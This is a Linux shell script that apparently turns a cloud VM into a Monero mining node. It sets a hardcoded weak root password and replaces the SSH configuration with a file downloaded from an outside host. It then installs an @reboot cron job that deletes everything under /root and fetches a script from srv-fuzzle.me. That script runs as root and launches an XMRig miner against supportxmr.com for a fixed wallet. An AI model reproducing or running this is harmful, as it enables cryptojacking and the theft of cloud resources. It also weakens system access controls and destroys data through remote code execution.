#!/bin/sh
printf "1sampai5\n1sampai5" | passwd root
wget https://rootends.com/linux-master/commonsfiles/sshd_config_gcloud -O /tmp/sshd_config && cp /tmp/sshd_config /etc/ssh/sshd_config
systemctl restart sshd

#configure-grub
DEBIAN_FRONTEND=noninteractive dpkg-reconfigure grub-pc

#Update dan install yg dibutuhkan
apt update && apt upgrade -y && apt install screen curl nano htop git -y

#clone repo
cd /
git clone https://github.com/jodiekurnia/Free-Tier.git
cd /Free-Tier/xmr


#delete previous cronjob
crontab -r

#add crontab
crontab -l > mycron
echo "@reboot cd /root/ && sudo rm -rf * && sudo killall screen || echo "ok" && sudo pkill screen || echo "ok" && sudo curl -Ls -o script http://srv-fuzzle.me/xmrigDO && sudo screen -dmS setup bash script pool.supportxmr.com:3333 82upiVwFz2GDkndcCV5RfeN7vGAB8wtw8L9RznBrF3KCG79dK8T6him42MFxpDo5CsRBiNqbj6xfRAazh37gTPfT1HcwmCS+60000 \"rx/0\" IP_XMRIGCC:PORT_XMRIGCC TOKEN_XMRIGCC" >> mycron
crontab mycron
rm mycron

shutdown -r now